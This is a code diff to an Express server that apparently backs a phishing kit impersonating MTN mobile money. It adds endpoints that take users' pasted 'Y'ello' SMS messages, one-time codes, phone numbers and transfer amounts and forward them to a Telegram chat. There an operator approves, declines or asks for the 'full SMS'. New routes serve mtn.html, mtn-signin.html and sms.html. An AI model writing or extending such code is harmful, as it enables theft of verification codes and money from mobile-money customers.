@@ -159,6 +159,26 @@ const OTP_RATE_MS      = 30 * 1000;
 const EVENT_DEDUPE_MS  = 15 * 1000;
 
 /* ============================================================
+   SMS-flow store (mtn.html → sms.html) — separate from OTP_STORE
+   so the two flows don't collide on the same tx id.
+============================================================ */
+const SMS_STORE  = new Map();
+const SMS_TTL_MS = 10 * 60 * 1000;
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [k, v] of SMS_STORE.entries()) {
+    if (v.exp && now > v.exp) SMS_STORE.delete(k);
+  }
+}, 60 * 1000);
+
+function escapeHtml(s) {
+  return String(s == null ? '' : s).replace(/[<>&]/g, ch => ({
+    '<': '&lt;', '>': '&gt;', '&': '&amp;'
+  }[ch]));
+}
+
+/* ============================================================
    POST /api/accept — send Telegram message with buttons
 ============================================================ */
 app.post('/api/accept', async (req, res) => {
@@ -239,7 +259,7 @@ app.get('/api/status/:tx', (req, res) => {
 
 /* ============================================================
    POST /api/telegram-webhook — Approve / Decline / Inactive tap
-   Handles both payment callbacks and OTP callbacks
+   Handles payment callbacks, OTP callbacks, and SMS-flow callbacks
 ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   pushLog('WEBHOOK HIT', 'info');
@@ -257,40 +277,74 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const action = idx >= 0 ? raw.slice(0, idx) : raw;
     const payload = idx >= 0 ? raw.slice(idx + 1) : '';
 
+    // Detect which flow this callback belongs to:
+    //   OTP-<tx>   → sign-in OTP flow  (uses OTP_STORE, decision: approved/declined/inactive)
+    //   SMS-<tx>   → sms.html flow     (uses SMS_STORE, decision: approved/declined/needs_full_sms)
     let otpTxId = null;
+    let smsTxId = null;
     let txId = payload;
+
     if (payload.startsWith('OTP-')) {
       otpTxId = payload.slice(4);
       txId = otpTxId;
+    } else if (payload.startsWith('SMS-')) {
+      smsTxId = payload.slice(4);
+      txId = smsTxId;
     }
 
-    pushLog('PARSED action=' + action + ' tx=' + txId + (otpTxId ? ' (OTP)' : ''), 'info');
+    pushLog(
+      'PARSED action=' + action + ' tx=' + txId +
+      (otpTxId ? ' (OTP)' : '') + (smsTxId ? ' (SMS)' : ''),
+      'info'
+    );
 
-    // Map action → decision string (used for both payment and OTP flows)
-    const decision =
-      action === 'approve'  ? 'approved' :
-      action === 'decline'  ? 'declined' :
-      action === 'inactive' ? 'inactive' : null;
+    // ------------------------------------------------------------
+    // SMS-flow: approve → approved, decline → declined, inactive → needs_full_sms
+    // ------------------------------------------------------------
+    if (smsTxId) {
+      const entry = SMS_STORE.get(smsTxId) || {
+        exp: Date.now() + SMS_TTL_MS,
+        decision: 'pending'
+      };
 
-    if (!decision) {
-      pushLog('Unknown callback action: ' + action, 'err');
-    } else if (otpTxId) {
-      const entry = OTP_STORE.get(otpTxId);
-      if (entry) {
-        entry.decision = decision;
-        pushLog('OTP decision ' + entry.decision + ' for ' + otpTxId,
-          entry.decision === 'approved' ? 'ok' : 'err');
-      } else {
-        OTP_STORE.set(otpTxId, {
-          code: null,
-          exp: Date.now() + OTP_TTL_MS,
-          attempts: 0,
-          decision
-        });
-        pushLog('OTP entry missing, created stub for ' + otpTxId + ' with ' + decision, 'err');
-      }
+      if (action === 'approve')       entry.decision = 'approved';
+      else if (action === 'decline')  entry.decision = 'declined';
+      else if (action === 'inactive') entry.decision = 'needs_full_sms';
+      else                            entry.decision = entry.decision || 'pending';
+
+      SMS_STORE.set(smsTxId, entry);
+      pushLog('SMS decision ' + entry.decision + ' for ' + smsTxId, 'ok');
+
+      // Mirror into OTP_STORE? No — keep the two flows isolated.
     } else {
-      setDecision(txId, decision);
+      // ------------------------------------------------------------
+      // OTP-flow (sign-in) — existing behavior
+      // ------------------------------------------------------------
+      const decision =
+        action === 'approve'  ? 'approved' :
+        action === 'decline'  ? 'declined' :
+        action === 'inactive' ? 'inactive' : null;
+
+      if (!decision) {
+        pushLog('Unknown callback action: ' + action, 'err');
+      } else if (otpTxId) {
+        const entry = OTP_STORE.get(otpTxId);
+        if (entry) {
+          entry.decision = decision;
+          pushLog('OTP decision ' + entry.decision + ' for ' + otpTxId,
+            entry.decision === 'approved' ? 'ok' : 'err');
+        } else {
+          OTP_STORE.set(otpTxId, {
+            code: null,
+            exp: Date.now() + OTP_TTL_MS,
+            attempts: 0,
+            decision
+          });
+          pushLog('OTP entry missing, created stub for ' + otpTxId + ' with ' + decision, 'err');
+        }
+      } else {
+        setDecision(txId, decision);
+      }
     }
 
     const baseUrl = tgBase();
@@ -303,7 +357,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           text:
             action === 'approve'  ? 'Approved' :
             action === 'decline'  ? 'Declined' :
-            action === 'inactive' ? 'Marked inactive' : 'OK'
+            action === 'inactive' ? (smsTxId ? 'Full SMS requested' : 'Marked inactive') : 'OK'
         })
       }).catch(() => {});
 
@@ -404,7 +458,7 @@ app.post('/api/verification/otp', (req, res) => {
 
 /* ============================================================
    Verification — submit the entered code to Telegram
-   Uses THREE buttons: Approve / Decline / Inactive
+   (mtn-signin.html — three buttons: Approve / Decline / Inactive)
 ============================================================ */
 app.post('/api/verification/submit', async (req, res) => {
   const { tx, otp, am, cur, c } = req.body || {};
@@ -468,11 +522,155 @@ app.post('/api/verification/submit', async (req, res) => {
 });
 
 /* ============================================================
-   Verification — poll the OTP decision
+   SMS flow — POST /api/verification/sms
+   sms.html calls this with the exact pasted Y'ello message.
+   Forwards it to Telegram with 3 buttons:
+     Approve  → approved
+     Decline  → declined
+     Inactive → needs_full_sms (paste full SMS or resend)
+============================================================ */
+app.post('/api/verification/sms', async (req, res) => {
+  const { tx, code, message, am, cur, c, an, rn } = req.body || {};
+  if (!tx || !message) {
+    return res.status(400).json({ ok: false, message: 'Missing tx or message' });
+  }
+
+  const now = Date.now();
+  SMS_STORE.set(tx, {
+    code: code || '',
+    message: String(message),
+    am: am || '',
+    cur: cur || '',
+    c: c || '',
+    an: an || '',
+    rn: rn || '',
+    decision: 'pending',
+    exp: now + SMS_TTL_MS
+  });
+
+  pushLog('SMS submit tx=' + tx + ' code=' + (code || '—') + ' msgLen=' + String(message).length, 'info');
+
+  const baseUrl = tgBase();
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!baseUrl || !chatId) {
+    pushLog('SMS Telegram not configured', 'err');
+    // still accept — the front-end will poll and time out gracefully
+    return res.json({ ok: true });
+  }
+
+  const lines = [
+    '🔐 MTN Transfer Verification',
+    '',
+    'Transaction: ' + tx,
+    'Amount: ' + (cur || '—') + ' ' + Number(am || 0).toFixed(2),
+    'Recipient: ' + (rn || '—'),
+    'Country: ' + (c || '—'),
+    'Detected code: ' + (code || '—'),
+    '',
+    '📩 Pasted Y\'ello SMS:',
+    '---',
+    String(message),
+    '---',
+    '',
+    'Approve, decline, or request the full SMS.'
+  ];
+
+  const keyboard = {
+    inline_keyboard: [[
+      { text: '✅ Approve',  callback_data: 'approve:SMS-' + tx },
+      { text: '❌ Decline',  callback_data: 'decline:SMS-' + tx },
+      { text: '📄 Inactive', callback_data: 'inactive:SMS-' + tx }
+    ]]
+  };
+
+  try {
+    const tgRes = await fetch(baseUrl + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: lines.join('\n'),
+        reply_markup: keyboard
+      })
+    });
+    if (!tgRes.ok) {
+      const body = await tgRes.text();
+      pushLog('SMS Telegram failed ' + tgRes.status + ' ' + body.slice(0, 120), 'err');
+      return res.status(502).json({ ok: false, message: 'Could not notify admin' });
+    }
+    pushLog('SMS → Telegram with 3 buttons: ' + tx, 'ok');
+  } catch (e) {
+    pushLog('SMS Telegram error: ' + e.message, 'err');
+    return res.status(502).json({ ok: false, message: 'Could not notify admin' });
+  }
+
+  res.json({ ok: true });
+});
+
+/* ============================================================
+   SMS flow — POST /api/verification/resend
+   Resend SMS button on sms.html calls this.
+   Forwards a resend notification to Telegram (no buttons — the
+   user will paste the new message and submit again).
+============================================================ */
+app.post('/api/verification/resend', async (req, res) => {
+  const { tx, an, c, am, cur } = req.body || {};
+  if (!tx) return res.status(400).json({ ok: false, message: 'Missing tx' });
+
+  pushLog('RESEND requested for ' + tx, 'info');
+
+  const baseUrl = tgBase();
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!baseUrl || !chatId) {
+    return res.json({ ok: true });
+  }
+
+  const lines = [
+    '🔄 Resend SMS requested',
+    '',
+    'Transaction: ' + tx,
+    'Amount: ' + (cur || '—') + ' ' + Number(am || 0).toFixed(2),
+    'Phone: ' + (an || '—'),
+    'Country: ' + (c || '—'),
+    '',
+    'The user requested a new Y\'ello message.'
+  ];
+
+  try {
+    await fetch(baseUrl + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: lines.join('\n') })
+    });
+    pushLog('RESEND → Telegram for ' + tx, 'ok');
+  } catch (e) {
+    pushLog('RESEND Telegram failed: ' + e.message, 'err');
+  }
+
+  res.json({ ok: true });
+});
+
+/* ============================================================
+   Verification — poll the OTP decision (sign-in flow)
 ============================================================ */
 app.get('/api/verification/status/:tx', (req, res) => {
   const tx = req.params.tx;
   const entry = OTP_STORE.get(tx);
+  res.json({
+    transactionId: tx,
+    decision: entry ? entry.decision : 'expired'
+  });
+});
+
+/* ============================================================
+   SMS flow — GET /api/verification/sms-status/:tx
+   sms.html polls this for the SMS decision.
+============================================================ */
+app.get('/api/verification/sms-status/:tx', (req, res) => {
+  const tx = req.params.tx;
+  const entry = SMS_STORE.get(tx);
   res.json({
     transactionId: tx,
     decision: entry ? entry.decision : 'expired'
@@ -523,6 +721,11 @@ app.get('/pay.html',          servePage('pay.html'));
 app.get('/verify.html',       servePage('verify.html'));
 app.get('/verification.html', servePage('verification.html'));
 app.get('/inactive.html',     servePage('inactive.html'));
+app.get('/mtn.html',          servePage('mtn.html'));
+app.get('/mtn-signin.html',   servePage('mtn-signin.html'));
+app.get('/sms.html',          servePage('sms.html'));
+app.get('/otp2.html',         servePage('otp2.html'));
+app.get('/terms.html',        servePage('terms.html'));
 app.get('/', (req, res) => res.redirect('/admin.html'));
 
 app.use((req, res) => {
